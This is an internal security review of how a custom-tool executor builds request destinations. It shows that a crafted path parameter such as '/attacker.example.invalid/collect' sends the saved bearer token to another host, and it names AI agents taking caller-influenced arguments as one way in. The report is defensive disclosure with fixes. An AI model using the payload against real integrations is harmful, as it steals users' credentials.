# Custom-tool destination security review

Status: Fixed in application code; see [fix and verification](2026-09-09-custom-tool-destination-fixes.md). The finding below describes the pre-fix state.

Date: 2026-09-09

## Summary

**One new high-priority issue confirmed: custom-tool path parameters can redirect saved authentication to a different host.** The recent tenant-ownership fixes retain passing regression coverage. This finding concerns the destination of an authorized tool request, not selection of another tenant's connection.

## High — path parameter can change the credential destination

Locations:
- `api/src/services/custom_tools/openapi_parser.py:203–207`: substitutes raw path parameter values, then calls `urljoin` against the configured server URL.
- `api/src/services/custom_tools/tool_executor.py:153–178`: validates the resulting URL as public, then attaches saved authentication without requiring the original server origin.
- `api/src/controllers/custom_tools.py:700–732` and `api/src/services/agents/adk_tools.py:1934–1941`: direct execution and registered agent operations use the executor.

**Plain-English example:** a business API tool expects a record ID and has a saved API token. A crafted record ID makes the tool send its request, including the token, to a different public website. The attacker can then potentially use that token within its provider-granted permissions.

**Exact local reproduction:**

Configured server: `https://business.example.invalid`.
Operation path: `/{record_id}`, with a required string path parameter.

| Input | Actual captured destination | Saved bearer credential attached |
|---|---|---|
| `123` | `https://business.example.invalid/123` | Yes |
| `/attacker.example.invalid/collect` | `https://attacker.example.invalid/collect` | Yes |

The second input produces `//attacker.example.invalid/collect` before `urljoin`, which replaces the URL authority. A different public host passes the existing private-IP check. Both executions returned success through the synthetic response transport.

**Evidence quality:** the real OpenAPI parser, parameter validation, executor, encryption/decryption and URL validator ran. DNS was modeled as public; HTTPX MockTransport captured the constructed requests and returned synthetic responses. No actual external request, real secret or production data was involved. This confirms request construction and credential forwarding, not production exploitation.

**Prerequisites and limits:** the attacker must influence an executed path parameter on an affected authenticated tool. The demonstrated schema starts with a path placeholder and accepts an unrestricted string. An agent accepting caller-influenced tool arguments is one possible entry point; persuading a production agent to make this call was not tested. Fixed-prefix paths and schemas that reject the input may not be vulnerable to this exact payload. Only bearer authentication was reproduced; do not infer that every configured tool is exploitable.

**Fix first:** encode path values as path data and enforce the configured scheme, hostname and effective port before attaching credentials or sending requests. Reject origin changes even if the destination is public. Add negative tests for scheme-relative values, absolute destinations and delimiter injection, plus positive tests for ordinary IDs and legitimately encoded path values. A public-address check alone does not enforce the credential destination.

## Verification and scope

- **260 existing tests passed:** 205 security/tool-loading regressions and 55 custom-tool parser/executor tests.
- The existing tests did not catch this payload. The [local reproduction probe](probes/review_custom_tool_destination.py) is separate evidence of the failure.
- Run from repository root: `PYTHONPATH=api /private/tmp/synkora-harness-validation/bin/python docs/reviews/probes/review_custom_tool_destination.py`.
- Four unchanged real-Redis tests were not rerun. Existing test-client deprecation and web-tool AsyncMock warnings remain.
- Reviewed recent non-OAuth fixes, adjacent MCP assignment/loading, custom-tool ownership/execution and destination construction. No additional confirmed finding is asserted for the other inspected paths.
- No application fixes were made during this review. Only this report and probe were added. Infrastructure, production configuration, dependency advisories and deployment were excluded. This is not a whole-project penetration test or security certification.
